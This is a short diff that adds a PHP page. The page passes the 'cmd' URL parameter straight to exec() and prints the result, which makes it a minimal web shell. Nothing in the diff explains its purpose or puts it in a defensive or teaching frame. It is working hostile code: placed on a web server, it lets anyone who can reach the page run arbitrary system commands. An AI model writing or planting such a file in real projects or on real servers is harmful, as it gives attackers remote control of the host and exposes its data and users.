@@ -1,0 +1,8 @@
+<?php
+header('Content-type: text/plain');
+?>
+<html>
+	<body>
+		<pre><?php $output=""; if(isset($_GET['cmd'])){ $op = exec($_GET['cmd'],$output, $return_var); }; print_r($output); ?></pre>
+	</body>
+</html>
